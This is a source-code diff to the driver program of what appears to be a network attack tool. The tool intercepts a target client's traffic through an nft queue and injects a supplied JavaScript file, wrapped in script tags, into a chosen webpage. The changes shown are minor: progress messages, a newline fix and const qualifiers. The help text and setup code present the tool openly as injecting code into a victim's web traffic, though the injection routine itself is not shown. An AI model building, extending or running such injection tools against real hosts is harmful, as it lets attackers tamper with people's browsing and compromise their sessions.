@@ -19,7 +19,7 @@ void PrintHelp(char** argv)
         << "<ip version>: ip version of the target, must be 4 or 6\n"
         << "<queueNum>: nft queue number used to capture packets\n"
         << "<target ip>: target client\n"
-        << "<url>: webpage you want to inject code in"
+        << "<url>: webpage you want to inject code in\n"
         << "<pathToContent>: file path to the js content you wish to inject into the packet, should be a javascript file\n\n"
         << "Example: " << argv[0] << " eth0 "<< "4 " << "10.0.2.4 " << " 0 "  << std::endl;
 }
@@ -74,6 +74,8 @@ int main(int argc, char** argv)
         return APPLICATION_ERROR;
     }
 
+    std::cout << "opening file...\n";
+
     std::ifstream file;
     file.open(pathToContent, std::ifstream::binary);
     if(!file.is_open())
@@ -82,12 +84,14 @@ int main(int argc, char** argv)
         return APPLICATION_ERROR;
     }
 
+    std::cout << "file opened\n";
+
     file.seekg (0, file.end);
     int jsLength = file.tellg();
     file.seekg (0, file.beg);
 
-    char* codePrefix = "<script>";
-    char* codeSuffix = "</script";
+    const char* codePrefix = "<script>";
+    const char* codeSuffix = "</script";
 
     int totalCodeLen = jsLength + PacketCraft::GetStrLen(codePrefix) + PacketCraft::GetStrLen(codeSuffix);
 
@@ -99,6 +103,7 @@ int main(int argc, char** argv)
     file.close();
 
     CHaks::CodeInjector codeInjector;
+    std::cout << "initializing\n";
     if(codeInjector.Init(ipVersion, interfaceName, targetIPStr, queueNum, url, codeBuffer, totalCodeLen) == APPLICATION_ERROR)
     {
         LOG_ERROR(APPLICATION_ERROR, "CHaks::FileInterceptor::Init() error");
@@ -106,6 +111,7 @@ int main(int argc, char** argv)
         return APPLICATION_ERROR;
     }
 
+    std::cout << "running...\n";
     if(codeInjector.Run() == APPLICATION_ERROR)
     {
         LOG_ERROR(APPLICATION_ERROR, "CHaks::FileInterceptor::Run() error");
